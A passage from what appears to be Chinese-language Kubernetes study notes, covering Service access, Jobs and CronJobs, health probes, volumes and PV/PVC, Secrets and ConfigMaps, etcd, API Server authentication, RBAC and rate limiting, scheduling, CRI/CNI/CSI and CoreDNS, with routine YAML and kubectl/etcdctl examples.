查询部署的服务信息时，也是通过请求 API Server 从 etcd 中读取服务的信息。\n访问 Service 的方式 # 如果未指定 type，则 Service 只能从 Cluster 内部通过 ClusterIP 访问。访问 Service 的流量通过 iptables 规则轮询转发到 Pod。\n除了 IP，也可以使用 Kubernetes 提供的 DNS 服务从 Cluster 内部访问 Service。例如，启动一个临时的 Pod：\nk run busybox --rm -it --image=busybox /bin/sh 在容器内部运行 wget nginx-svc.default:8080，可以获取到网页内容；如果容器与 Service 同处于一个 Namespace（如 default），那么可以省略掉 .default 这一 Namespace 声明。\n而如果要从 Cluster 外部访问 Service，就需要设置 type 为 NodePort 或 LoadBalancer。前者通过 iptables 将端口映射到所在 Node 的端口上，后者则使用云服务商的 Load Balancer 对流量进行负载均衡。\nDaemonSet # DaemonSet 部署的 Pod 在每个 Node 上最多只能运行一个副本，适合监控和日志收集等类似守护进程的服务。需要注意的是，DaemonSet 部署的 Pod 会绕过调度器并忽略节点的 Unschedulable 属性。\nJob # Job 中配置的任务在容器中只会运行一次，完成之后容器就会停止。\n常用资源 YAML # Deployment 和 Service # 更常用也更方便的创建 / 修改服务的方法是使用 yaml 文件，例如：\napiVersion: apps/v1 kind: Deployment metadata: # metadata for deployment name: nginx # required metadata spec: # specification for deployment selector: matchLabels: app: nginx replicas: 3 template: # pod template metadata: # metadata for pod labels: app: nginx # at least one label required spec: # specification for pod containers: - name: nginx image: nginx ports: - containerPort: 80 然后运行 k apply -f nginx-deploy.yml 就可以创建 Deployment，或是修改现有的 Deployment。删除的话，把 apply 换成 delete 即可。\n对于 Service 来说同理，可以编写 nginx-service.yml：\napiVersion: v1 kind: Service metadata: name: nginx-svc spec: type: NodePort # map to a port on the Node selector: app: nginx # select pods according to labels ports: - protocol: TCP nodePort: 30000 # Node:30000 port: 8080 # ClusterIP:8080 targetPort: 80 # pod:80 可以发现，Service 通过 labels 来筛选 Pod。同样地，Pod 也可以通过 labels 来筛选 Node：\nk label node node1 disktype=ssd k get node --show-labels 随后在 nginx-deploy.yml 下的 .spec.template.spec 下添加：\nnodeSelector: diskType: ssd 就可以确保该 Deployment 的所有 Pod 都被分配到指定 Node 上。当然也可以删除 Node 上的 labels：\nk label node node1 disktype- Job # apiVersion: batch/v1 kind: Job metadata: name: pi spec: completions: 4 parallelism: 2 template: # pod template spec: containers: - name: pi image: perl command: [\u0026#34;perl\u0026#34;, \u0026#34;-Mbignum=bpi\u0026#34;, \u0026#34;-wle\u0026#34;, \u0026#34;print bpi(2000)\u0026#34;] restartPolicy: Never backoffLimit: 4 Job 语法大同小异，parallelism 控制并行 Pod 数量，completions 控制任务总共需要完成多少次， restartPolicy 对 Job 而言只能是 Never 或 OnFailure，backoffLimit 限制了最大的重试次数。\nrestartPolicy 对 Deployment 而言还可以是 Always，此时即使容器进程返回了 0 也依然会重启容器。\n如果任务运行失败，由于 restartPolicy 为 Never，容器不会被重启，但会不断创建新的 Pod 重新运行；如果 restartPolicy 为 OnFailure ，由于容器会被重启，因此不会创建新的 Pod。\n要查看已完成 Job 的执行结果，假设 Pod 名称为 pi-trvkr，可以使用命令 k logs pi-trvkr。\n值得注意的是，和 Istio 一起使用时会受到 Sidecar 注入影响，Kubernetes 会认为 Job 没有执行完成，但实际上 Job 的执行并没有受到影响。为了解决这一问题，可以在 Pod 模版中关闭 Sidecar 注入，即在 .spec.template 下添加：\nmetadata: annotations: sidecar.istio.io/inject: \u0026#34;false\u0026#34; CronJob # 定时任务实际上是在 Job 外面套了一层 spec，主要是为了增加 schedule 字段，其格式和 crontab 的格式相同：\napiVersion: batch/v1 kind: CronJob metadata: name: hello spec: schedule: \u0026#34;*/1 * * * *\u0026#34; jobTemplate: spec: template: # pod template spec: containers: - name: hello image: busybox imagePullPolicy: IfNotPresent command: - /bin/sh - -c - date; echo Hello from the Kubernetes cluster restartPolicy: OnFailure 同理，CronJob 也存在和 Sidecar 冲突的问题，解决方法和上述一致，插入位置是 .spec.jobTemplate.spec.template 下。\n从资源名称同样可以看出这里的层级关系：CronJob（hello）-\u0026gt; Job（hello-27231469）-\u0026gt; Pod（hello-27231469-bjbjw）。\nHealth Check # 默认情况下，容器运行的进程返回非 0 时，Kubernetes 会认为出现了错误，此时 Health Check 不通过。然而出现错误时容器内进程未必会返回，因此我们可以自定义 Health Check 的规则。\n例如，创建一个带 livenessProbe 的 Pod：\napiVersion: v1 kind: Pod metadata: name: liveness labels: test: liveness spec: restartPolicy: OnFailure containers: - name: liveness image: busybox args: - /bin/sh - -c - touch /tmp/healthy; sleep 30; rm -rf /tmp/healthy; sleep 600 livenessProbe: exec: command: - cat - /tmp/healthy initialDelaySeconds: 10 # start probing after 10s periodSeconds: 5 # probe every 5s 这里就是通过 exec 了 cat /tmp/healthy 返回值是否为 0 来判断容器是否存活，如果三次探测均失败，则会认为发生了 Failure，触发 OnFailure 重启容器。可以查看日志确认这一点：\nWarning Unhealthy 2s (x3 over 12s) kubelet Liveness probe failed: cat: can\u0026#39;t open\u0026#39;/tmp/healthy\u0026#39;: No such file or directory Normal Killing 2s kubelet Container liveness failed liveness probe, will be restarted Liveness 探测主要用来通知 Kubernetes 尝试重启容器，而另一种 Health Check 机制 Readiness 探测则用来通知 Kubernetes 容器已经可以正常提供服务了。和 Liveness 探测语法上的唯一区别就是把 livenessProbe 改成 readinessProbe。Readiness 探测，从现象上看，影响的是 Pod 的 READY 状态。\n而 Startup 探测适用于启动时间较长的应用，在 READY 前以一个更低的频率进行 Readiness Check，避免高频检测影响应用启动。\n这三种 Pod 都支持三种检测方法：执行命令、探测 TCP 端口以及发送 HTTP GET 请求。\n扩容应用检查 # 一个典型的使用场景就是在扩容应用时，检查新增加的 Pod 是否能正常工作。例如对于一个 Web 服务，可以这样写探测器：\nreadinessProbe: httpGet: scheme: HTTP path: /healthy port: 8080 initialDelaySeconds: 10 periodSeconds: 5 此时 Kubernetes 会判断返回的状态码是否在 200 - 400 之间。\n滚动更新检查 # 另一个更实用的场景是在滚动更新时，确保新上线的 Pod 能正常工作，避免更新后全线宕机不得不回滚的状况。\n我们知道，滚动更新过程中会逐步增加新的 Pod，删除旧的 Pod。maxSurge 和 maxUnavailable 分别是对这两个过程的量化。\nmaxSurge 控制 副本总数 - 预期副本数 的最大值 可以为具体数字 默认为 预期副本数 的 25% 向上取整 确保不会增加太多新 Pod maxUnavailable 控制 不可用副本数 的最大值 可以为具体数字 默认为 预期副本数 的 25% 向下取整 确保不会删除太多旧 Pod 这里的 Unavailable，便是通过 readinessProbe 来探测的。我们可以在 Deployment 的 .spec 下添加内容来自定义这两个值：\nstrategy: rollingUpdate: maxSurge: 30% maxUnavailable: 30% Volume # 和 Docker 中的 Volume 类似，用于提供持久化存储。同一个 Pod 中所有容器都可以访问 Mount 到这个 Pod 上的 Volume。\nemptyDir Volume # 这种 Volume 在 Pod 被删除时也会被删除，不过不受容器被删除的影响。\napiVersion: v1 kind: Pod metadata: name: producer-consumer spec: containers: - name: producer image: busybox volumeMounts: - mountPath: /producer_dir name: shared-volume args: - /bin/sh - -c - echo \u0026#34;hello\u0026#34; \u0026gt; /producer_dir/hello; sleep 30000 - name: consumer image: busybox volumeMounts: - mountPath: /consumer_dir name: shared-volume args: - /bin/sh - -c - cat /consumer_dir/hello; sleep 30000 volumes: - name: shared-volume emptyDir: {} 上述 yaml 会创建一个含 producer 和 consumer 两个容器的 Pod，前者向 shared-volume 也就是容器内的 /producer_dir 写数据，后者从 shared-volume 也就是容器内的 /consumer_dir 读数据，最终可以通过 k logs producer-consumer consumer 查看读取到的数据。\n这种 Volume 由于在 Pod 被删除后就会消失，比较适合在容器间临时共享存储。但在创建时建议设置 sizeLimit 防止占用空间过大。可以认为，emptyDir 是一种不能指定 path 和 type 的 hostPath。\nhostPath Volume # 这个也比较好理解，就是把容器所处的宿主机 host 上的某个 path 作为 Volume 进行挂载，好处是目录并不会受到 Pod 删除的影响，并且能够更方便地访问宿主机上的文件——这也是这种方式的坏处，即增加了 Pod 和 Node 的耦合度。语法一般如下：\nvolumes: - hostPath: path: /etc/ssl/certs type: DirectoryOrCreate name: ca-certs 可以想到，如果 Pod 被调度到了其他 Node 上，那么 hostPath 很可能就失效了。\n外部存储 # 如果需要持久化的存储，可以使用各种外部存储例如 AWS、GCP、Azure 提供的存储服务，或是使用 Ceph 等分布式存储，语法各不相同，可以参考对应的文档。\nPV 和 PVC # PersistentVolume 也是持久化的存储，通过 PersistentVolumeClaim 来申请，Kubernetes 会根据条件分配适合的 PV。这实际上就是对 Volume 作了一层封装，使得用户不需要关心所获得的存储空间的底层信息。\n创建 PV：\napiVersion: v1 kind: PersistentVolume metadata: name: pv1 spec: capacity: storage: 1Gi accessModes: - ReadWriteOnce # mount to a single node persistentVolumeReclaimPolicy: Recycle storageClassName: nfs # like label selector nfs: path: /nfs/pv1 server: 1.1.1.1 # nfs server 其中 accessModes 指定了访问模式为可读写且只能挂载到单个 Node 上，对应的还有 ReadOnlyMany、ReadWriteMany 等模式。persistentVolumeReclaimPolicy 指定了回收机制，Retain 需要手工回收，Recycle 会清除 PV 中所有数据，而 Delete 则会删除外部存储（一般是云平台）中的存储资源本身。\n然后创建 PVC，过程类似：\napiVersion: v1 kind: PersistentVolumeClaim metadata: name: pvc1 spec: accessModes: - ReadWriteOnce resources: requests: storage: 1Gi storageClassName: nfs 成功创建后，pv1 和 pvc1 的状态会变为 BOUND。之后如果需要在 Pod 中使用存储，只需要修改 .spec.volumes 如下：\nvolumes: - name: data persistentVolumeClaim: claimName: pvc1 使用完毕后，用 k delete pvc pvc1 删除 PVC 来回收 PV，此时 PV 状态会变成 Released，随后 Kubernetes 会启动一个 recycler Pod 进行内容清除工作并将 PV 状态重新设为 Available。如果是 Retain 模式则不会启动 recycler，PV 始终处于不可用的 Released 状态，但即使此时删除 PV 并重新创建，PV 中的数据也依然存在。\n此外，还可以使用外部的 StorageClass 以实现 PV 的动态供给，此时创建 PVC 时如未找到合适的 PV 就会自动创建。\n要实现动态供给，在 PVC 的 .spec.storageClassName 中指定 StorageClass 的 .metadata.name 即可。\n配置管理 # Secret # 说到配置管理，首先不得不提的就是如何管理配置中的敏感信息。在 GitHub 中这是通过 Repo 的 Secrets 来管理的，Kubernetes 中也同理，通过 Secret 管理。Secret 可以作为一种特殊的 Volume 并挂载到 Pod 上供读取。\n首先创建 Secret：\napiVersion: v1 kind: Secret metadata: name: secret data: username: YWRtaW4= password: MTIzNDU2 需要注意的是，Secret 的 key-value 中 value 必须经过 Base64 编码。\n创建后就可以用 k get secret 和 k describe secret 查看了。\n之后创建对应的 Volume，就可以挂载到 Pod 了：\napiVersion: v1 kind: Pod metadata: name: secret-pod spec: containers: - name: secret-container image: busybox volumeMounts: - name: secret-volume mountPath: /etc/secret readOnly: true args: - /bin/sh - -c - sleep 10; touch /tmp/healthy; sleep 30000 volumes: - name: secret-volume secret: secretName: secret 之后 k exec -it secret-pod -- sh 并 ls /etc/secret 就可以看到每个 key 都是一个文件，内容就是 Base64 解码后的 value。当 Secret 本身更新时，文件的内容也会自动更新。\n另一种方法是用 Secret 配置环境变量，只需要在 .spec.containers[i] 下添加：\nenv: - name: USERNAME valueFrom: secretKeyRef: name: secret key: username 这种方式更为方便，但是不支持同步更新 Secret。\n而对于剩余的不那么敏感的信息，就不需要使用 Secret 了，而是使用 ConfigMap 来配置。\nConfigMap # ConfigMap 与 Secret 的 YAML 格式非常相似，区别在于：\n数据不需要 Base64 编码 .kind 改为 ConfigMap 通过 Volume 挂载与配置环境变量的过程也完全一致：\nvolumes: - name: configmap-volume configMap: name: configmap env: - name: USERNAME valueFrom: configMapKeyRef: name: configmap key: username etcd # etcd 通过 key-value 对存储来自 API Server 的数据，其最重要的特性是可以监测数据的变更，因此可以当成消息队列来用。etcd 也可以用于服务发现和配置共享，其中 key 在经过一段时间（TTL）后可能失效，因此存在对应的续约机制，而这种机制恰好可以作为服务发现中的心跳来使用。\n为保障数据一致性，etcd 采用了 Raft 协议。Raft 协议遵循 quorum 机制，也就是多数同意的规则，具体原理在 The secret lives of data 上有非常生动的解释。\n在 4.2.1 版本中引入了新角色 Learner，使得新节点加入时只接收数据而不投票，因此不影响 quorum，防止过度消耗 Leader 带宽。\n安装 # 在 Release 页面 有详尽且稳定的安装步骤。\n启动 # 为了防止和 k8s 的 etcd 容器端口冲突，我们可以手动指定监听端口。其中 listen-client-urls 和 listen-peer-urls 是 etcd 服务器监听客户端和其他服务器请求的地址，而 advertise-client-urls 和 initial-advertise-peer-urls 是 etcd 客户端和其他服务器向 etcd 服务器发起请求所使用的端口。\n$ etcd --initial-cluster \u0026#34;default=http://localhost:12380\u0026#34; \\ --listen-client-urls \u0026#34;http://localhost:12379\u0026#34; \\ --listen-peer-urls \u0026#34;http://localhost:12380\u0026#34; \\ --advertise-client-urls \u0026#34;http://localhost:12379\u0026#34; \\ --initial-advertise-peer-urls \u0026#34;http://localhost:12380\u0026#34; 常用操作 # # list all members in table etcdctl --endpoints=localhost:12379 member list --write-out=table # put data etcdctl --endpoints=localhost:12379 put /a b etcdctl --endpoints=localhost:12379 put /c d # read keys and values in / etcdctl --endpoints=localhost:12379 get --prefix / # read keys in / etcdctl --endpoints=localhost:12379 get --prefix / --keys-only # watch changes in / etcdctl --endpoints=localhost:12379 watch --prefix / # put new data in /a etcdctl --endpoints=localhost:12379 put /a e # get old data etcdctl --endpoints=localhost:12379 get /a --rev=2 这里查询历史版本的原理涉及到 etcd 底层的存储机制。etcd 采用 kvindex 作内存索引，boltdb 进行存储。其中 kvindex 的 key 存储实际数据的 key，而 value 则存储 revision 信息。而 boltdb 中 key 存储的是 revision 信息，而 value 则是实际数据的 key-value 对。这样对数据的读写就遵循 key-\u0026gt;kvindex-\u0026gt;boltdb-\u0026gt;value 的路径操作指定版本的数据。\nKubernetes 各种 API Resources 中的 resourceVersion 的值就来自于 etcd 的 revision 信息。\n灾备 # # backup etcdctl --endpoints=localhost:12379 snapshot save snapshot.db # restore etcdctl --endpoints=localhost:12379 snapshot restore snapshot.db # --initial-cluster=... 🌰：启动三节点 HTTPS 集群 # # each etcd instance name need to be unique # x380 is for peer communication # x379 is for client communication # dir-data cannot be shared nohup etcd \\ --name infra0 \\ --data-dir=/tmp/etcd/infra0 \\ --listen-peer-urls https://127.0.0.1:3380 \\ --initial-advertise-peer-urls https://127.0.0.1:3380 \\ --listen-client-urls https://127.0.0.1:3379 \\ --advertise-client-urls https://127.0.0.1:3379 \\ --initial-cluster-token etcd-cluster-1 \\ --initial-cluster infra0=https://127.0.0.1:3380,infra1=https://127.0.0.1:4380,infra2=https://127.0.0.1:5380 \\ --initial-cluster-state new \\ --client-cert-auth --trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem \\ --peer-client-cert-auth --peer-trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --peer-cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --peer-key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem 2\u0026gt;\u0026amp;1 \u0026gt; /var/log/infra0.log \u0026amp; nohup etcd \\ --name infra1 \\ --data-dir=/tmp/etcd/infra1 \\ --listen-peer-urls https://127.0.0.1:4380 \\ --initial-advertise-peer-urls https://127.0.0.1:4380 \\ --listen-client-urls https://127.0.0.1:4379 \\ --advertise-client-urls https://127.0.0.1:4379 \\ --initial-cluster-token etcd-cluster-1 \\ --initial-cluster infra0=https://127.0.0.1:3380,infra1=https://127.0.0.1:4380,infra2=https://127.0.0.1:5380 \\ --initial-cluster-state new \\ --client-cert-auth --trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem \\ --peer-client-cert-auth --peer-trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --peer-cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --peer-key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem 2\u0026gt;\u0026amp;1 \u0026gt; /var/log/infra1.log \u0026amp; nohup etcd \\ --name infra2 \\ --data-dir=/tmp/etcd/infra2 \\ --listen-peer-urls https://127.0.0.1:5380 \\ --initial-advertise-peer-urls https://127.0.0.1:5380 \\ --listen-client-urls https://127.0.0.1:5379 \\ --advertise-client-urls https://127.0.0.1:5379 \\ --initial-cluster-token etcd-cluster-1 \\ --initial-cluster infra0=https://127.0.0.1:3380,infra1=https://127.0.0.1:4380,infra2=https://127.0.0.1:5380 \\ --initial-cluster-state new \\ --client-cert-auth --trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem \\ --peer-client-cert-auth --peer-trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --peer-cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --peer-key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem 2\u0026gt;\u0026amp;1 \u0026gt; /var/log/infra2.log \u0026amp; API Server # 任何请求到达 API Server 后首先都必须经过认证、鉴权、准入控制、限流等阶段，之后才会被接受。\n认证 # Kubernetes 支持多种认证方式：\n证书（--client-ca-file） 静态 token（--token-auth-file，csv 文件） Bootstrap Token（kube-system 中的 Secret） 静态口令（--basic-auth-file，csv 文件） ServiceAccount OpenID（OAuth 2.0） Webhook（--authtication-token-webhook-config-file） 匿名访问（--anonymous-auth） 其中 Webhook 需要用户自己编写认证服务，使用 TokenReview 进行认证和返回结果。\n鉴权 # Kubernetes 支持的鉴权方式包括：\nABAC（不推荐） RBAC Webhook Node 例如，要使用 RBAC，首先要创建相应的角色，如 Role 和跨 Namespace 的 ClusterRole：\napiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: namespace: default name: pod-reader rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;pods\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;list\u0026#34;] apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: secret-reader rules: - apiGroups: [\u0026#34;\u0026#34;] resources: [\u0026#34;secrets\u0026#34;] verbs: [\u0026#34;get\u0026#34;, \u0026#34;watch\u0026#34;, \u0026#34;list\u0026#34;] 随后，通过 RoleBinding（或 ClusterRoleBinding） 将 Role 绑定到具体的 subject（用户、组、ServiceAccount 等） 上：\napiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: namespace: dev # only grant perm in dev namespace name: read-secrets subjects: - kind: User name: dave apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole name: secret-reader apiGroup: rbac.authorization.k8s.io 准入 # 准入控制在授权后对请求进一步验证，粒度更细。准入控制由多个插件共同决定，通过了所有插件的检查，请求才会最终被接受。常见的插件包括：\nAlwaysAdmit 接受任意请求 AlwaysPullImages 总是拉取最新镜像，无论本地是否已存在 SecurityContextDeny 拒绝包含非法 SecurityContext 的请求 ResourceQuota 用来限制 Pod 请求的配额 DefaultStorageClass 为 PVC 设置默认的 StorageClass 一个有用的场景就是创建一个 ResourceQuotaController，当 Namespace 创建时自动创建 ResourceQuota，使得 ResourceQuota 插件生效，从而能够限制用户的资源配额。\n毫无疑问，准入插件能做到非常多的事情，因此 Kubernetes 一定会允许我们自定义这样的插件。如果我们只对准入对象进行校验而不作修改，那么可以配置 ValidatingWebhookConfiguration；反之，如果需要修改准入对象，就需要 MutatingWebhookConfiguration 了。\n一个简单的 MutatingWebhook 的例子可以在 这里 找到。\n限流 # API Server 使用 max-requests-inflight 限制给定时间内最大 non-mutating 请求数，用 max-mutating-requests-inflight 限制给定时间内最大 mutating 请求数。这两个值会随着节点数的增加而增加。\n然而，这类传统限流方式存在诸多局限性：\n粒度较粗，无法为不同场景设置不同限流策略 单一队列，使得恶意流量能够影响正常流量 容易产生饥饿问题 缺少优先级，系统指令同样被限流 因此，API Server 使用 API Priority and Fairness 在更细粒度上分类请求并分别限流。每一个分类对应一种 FlowSchema，同一 FlowSchema 内的请求又会被 distinguisher 分到不同的 Flow 中。最后，APF 使用混洗分片技术将请求分配到不同队列中。这种排队机制既防止了饥饿问题，又能一定程度上应对突发流量。\napiVersion: flowcontrol.apiserver.k8s.io/v1beta1 kind: FlowSchema metadata: name: kube-scheduler spec: distinguisherMethod: type: ByNamespace # A FlowSchema and a distinguisher identify a flow matchingPrecedence: 800 # rule priority priorityLevelConfiguration: name: workload-high # queue priority rules: - resourceRules: - resources: - \u0026#34;*\u0026#34; verbs: - \u0026#34;*\u0026#34; subjects: - kind: User user: name: system:kube-scheduler 在另一个维度上，Priority 设置了请求的优先级。不同优先级之间的请求同样相互隔离，并且拥有独立的并发限制。对于系统指令类的流量，还可以设置为豁免流量，不受到限流的限制。\napiVersion: flowcontrol.apiserver.k8s.io/v1beta1 kind: PriorityLevelConfiguration metadata: name: global-default spec: limited: assuredConcurrencyShares: 20 # max concurrent requests allowed limitResponse: queuing: handSize: 6 # number of queues per flow queueLengthLimit: 50 # max queue length queues: 128 # queue number type: Queue type: Limited Scheduler # 资源需求 # 如上文所述，调度器可以使用 nodeSelector 调度 Pod 到指定的 Node 上，也可以通过 Pod 的资源需求来调度 Pod。此时，调度器关注的是 .spec.resources.requests ，而 cgroups 则使用 .spec.resources.limits 限制 Pod 中的 container 能使用的资源上限。例如，cpu: 1 意味着容器可以获得一个 CPU 的全部时间片，而 cpu: 1m 则表示一个 CPU 的全部时间片的千分之一。\n根据 resources 字段的设置，container 的资源需求可以分为三种 qosClass（对应的 QoS 从高到低）：\nGuarantee：resources 下的 request 等于 limit Burstable：resources 下的 request 小于 limit BestEffort：不设置 resources 字段 当节点资源不足时，会按 BestEffort、Burstable、Guarantee 的顺序依次驱逐 Pod。\n同时，也可以使用 LimitRange 来给所有没有设置 resources 的 container（包括 initContainers）加上默认的 resources 字段：\napiVersion: v1 kind: LimitRange metadata: name: mem-limit-range spec: limits: - default: memory: 512Mi defaultRequest: memory: 256Mi type: Container Affinity # 另一种调度方式是根据 Pod 的 nodeAffinity 和 nodeAntiAffinity。requiredDuringSchedulingIgnoredDuringExecution 和 preferredDuringSchedulingIgnoredDuringExecution 分别表示强亲和性和弱亲和性，前者在找不到亲和的 Node 时不会运行。\n强亲和性 Pod 语法如下：\ntemplate: metadata: labels: app: nginx spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: disktype operator: In values: - ssd containers: - name: nginx image: nginx 弱亲和性：\nspec: affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 1 preference: matchExpressions: - key: disktype operator: In values: - ssd 同理，可以用 podAffinity 和 podAntiAffinity 指定 Pod 间亲和性，即判断某一个范围内（由 topologyKey 指定）现有的 Pod 是否满足相应条件来进行调度。\nTaint 和 Toleration # Taint 会给 Node 加污点，来防止任意 Pod 被调度到该 Node 上。同时，我们可以给部分 Pod 指定 Toleration，使得这些 Pod 能够容忍这些污点并被调度到该 Node 上。\n存在三种污点类型：\nNoSchedule 会使得新 Pod 不再调度到该 Node 上，但现有 Pod 不受影响 PreferNoSchedule 会使得新 Pod 尽量不调度到该 Node 上，但现有 Pod 不受影响 NoExecute 会使得新 Pod 不再调度到该 Node 上，且对于现有 Pod，会在 Pod 的 tolerationSeconds 秒后，驱逐对应的 Pod 例如，先给某个 Node 加污点：\n$ k taint no node0 key=value:NoSchedule 随后创建 Pod，会发现无法调度到该 Node 上，直到我们取消这个污点：\n$ k taint no node0 key=value:NoSchedule- 或是给新的 Pod 添加 Toleration：\ntemplate: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx tolerations: - key: key operator: Equal value: value effect: NoSchedule PriorityClass # 最后，可以为 Pod 设置调度优先级。首先定义 PriorityClass：\napiVersion: v1 kind: PriorityClass metadata: name: high-priority value: 1000000 globalDefault: false description: \u0026#34;the greater the value, the higher the priority\u0026#34; 随后在 Pod 中设置该 PriorityClass：\ntemplate: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx priorityClassName: high-priority CRI / CNI / CSI # CRI # 常见的容器运行时接口包括 Docker、containerd、CRI-O 等，采用的是主流的 runc 规范。由于 Docker 本身是一个独立的产品，用在 Kubernetes 里显得较重。而 containerd 则在实现上和使用上都更为轻量——实际上，即使使用 Docker 作为 CRI，Kubernetes 底层依然是经由 Docker，从而在 containerd 中运行容器的。\n因此，可以说目前 Kubernetes 最合适的 CRI 是 containerd。\nCNI # 在 Kubernetes 中，网络模型是非常直观、符合直觉的：\n每个 Pod 都有自己的 IP 地址，但每次重建后可能发生变化 同一个 Pod 中的容器共享网络 Namespace，因此可直接通过 localhost 通信 Pod 的 IP 对整个集群可见，集群中任意 Pod 或 Node 访问一个 Pod 都无需经过 NAT 由于 Pod 的 IP 地址不稳定，可以通过 Service 来访问 Pod，同时 Service 本身具备负载均衡功能 为了让各厂商不同的网络标准和工具都能符合这种网络模型，也为了让网络能与各种 CRI 兼容，Kubernetes 采用容器网络接口规范，通过插件的形式构建网络。插件中一般会定义如何分配 IP、如何设置网卡、如何限流、如何设置防火墙、如何端口转发等等。常见的插件包括 Flannel、Calico、Cilium 等。\n例如，Calico 对同网段通信采用 BGP 协议来路由数据包，此时不需要封包；对跨网段通信，则使用 IPinIP 封装 IP 数据包。此外，Calico 支持使用 ACLs 协议和 kube-proxy 来创建 iptables 过滤规则，从而隔离容器网络。\n在调用任何插件前，CRI 必须先创建一个网络 Namespace。这也是为什么一个运行的 Pod 中即使只声明了一个容器，也会出现另外一个 pause 容器（这一步称为 createPodSandbox）。pause 容器只运行 sleep infinity ，几乎不占 CPU 和内存，主要作用就是为了为当前 Pod 创建好网络 Namespace 供同一 Pod 中其他容器，也就是我们声明的容器使用。\nCSI # 容器存储接口方面，选择就比较单一了，因为 OverlayFS 性能过于强势。Docker 和 containerd 也默认使用 OverlayFS 作为运行时存储驱动。上文提到的 emptyDir、hostPath、PV 和 PVC、外部存储等，都实现了 CSI 接口，因此可以在不同场景下为 Pod 所挂载并使用。CSI 也同样支持插件系统。\nkubelet 创建 Pod 时首先会调用 CSI 接口，初始化容器存储，比如挂载 Volume 等；随后 createPodSandbox 准备好 pause 容器并运行；接着调用 CRI 的接口，启动容器、创建好 Pod 的网络 Namespace，为构建网络作好准备；最后才调用 CNI 的接口真正构建容器网络。\nPod 生命周期钩子 # 和 Vue 里的生命周期钩子类似，Pod 中的 container 也可以定义 postStart 钩子和 preStop 钩子。postStart 钩子在容器启动后运行，但无法保证其和容器 Entrypoint 谁先执行，运行完 postStart 后容器才会被标记为 Running。\npreStop 则只有在 Pod 被删除时（而不是完成时 / 容器退出时）才会执行，执行完毕后 Kubernetes 会向容器发送 SIGTERM 信号。如果 preStop 执行时间和容器收到 SIGTERM 后花费的时间加起来超过了 terminationGracePeriodSeconds，那么容器就会收到 SIGKILL 信号强制退出。\n值得注意的是，bash / sh 会忽略 SIGTERM 信号，这使得 terminationGracePeriodSeconds 失去意义。因此，用 bash / sh 作为容器 Entrypoint 时，应设置尽量小的超时时间。\n服务发现与负载均衡 # Endpoint # 当我们创建一个 selector 不为空的 Service 时，Endpoint Controller 会监听到这一事件并创建同名的 Endpoint 对象。满足 selector 要求的所有 Pod 的 IP 都会被配置到 Endpoint 的地址列表中。例如，通过 k get po -owide 查看一个 Deployment 中一组 Pod 的 IP，分别为 10.1.1.114、10.1.1.111、10.1.1.112。随后查看对应 Service 所对应的 Endpoint：\n$ k describe ep nginx-svc Name: nginx-svc Namespace: default Labels: \u0026lt;none\u0026gt; Annotations: endpoints.kubernetes.io/last-change-trigger-time: 2021-11-26T12:37:50Z Subsets: Addresses: 10.1.1.111,10.1.1.112,10.1.1.114 NotReadyAddresses: \u0026lt;none\u0026gt; Ports: Name Port Protocol ---- ---- -------- \u0026lt;unset\u0026gt; 80 TCP Events: \u0026lt;none\u0026gt; 可以在 Subsets 下的 Addresses 里发现这三个地址，说明实际进行流量转发的是 Service 底层的 Endpoint 对象。\n如果不为 Service 定义 selector，那么就不会创建对应的 Endpoint。此时可以手动创建 Endpoint 指向指定的地址。\nkube-proxy # 流量的转发是 kube-proxy 的主要任务之一。kube-proxy 使用 iptables 中配置的转发规则，以 1/n 的概率转发到 n 个 IP 中的某一个上。为了解决在转发规模较大时 iptables 的性能问题、以及基于概率的伪负载均衡问题，目前可以采用 ipvs 配置更简洁的规则和更丰富的负载均衡类型，如 round-robin 等。\n总的来说，外部流量从 API Server 进入，经过 Service Controller -\u0026gt; 外部 Load Balancer（如果存在） -\u0026gt; kube-proxy -\u0026gt; NodePort IP（如果存在） -\u0026gt; ClusterIP（如果存在） 的顺序最终到达 Pod IP。\nCoreDNS # CoreDNS 就是 Kubernetes 内部的 DNS 服务器。对于包含 ClusterIP 的 Service，CoreDNS 都会创建 $svcName.$namespace.svc.$clusterdomain: clusterIP 的 A 记录和 PTR 记录，并为端口创建 SRV 记录。如果 Service 显式指定了 .spec.ClusterIP 为 None，那么 CoreDNS 会创建多条 A 记录，分别指向每个 Ready 的 Pod IP，格式类似 $podName.$svcName.$namespace.svc.$clusterdomain。而如果 Service 指定了 .spec.externalName，那么 CoreDNS 只会创建对应的 CNAME 记录。\n在每个 Pod 的 /etc/resolv.conf 中，都可以看到 nameserver 地址（也就是 CoreDNS 服务的地址）和搜索规则，CoreDNS 依次尝试在要解析的域名后添加这些域名来拼凑出完整的域名。\n$ cat /etc/resolv.conf nameserver 10.96.0.10 search default.svc.cluster.local svc.cluster.local cluster.local options ndots:5 Ingress # 上面提到的 Service 设置的外部 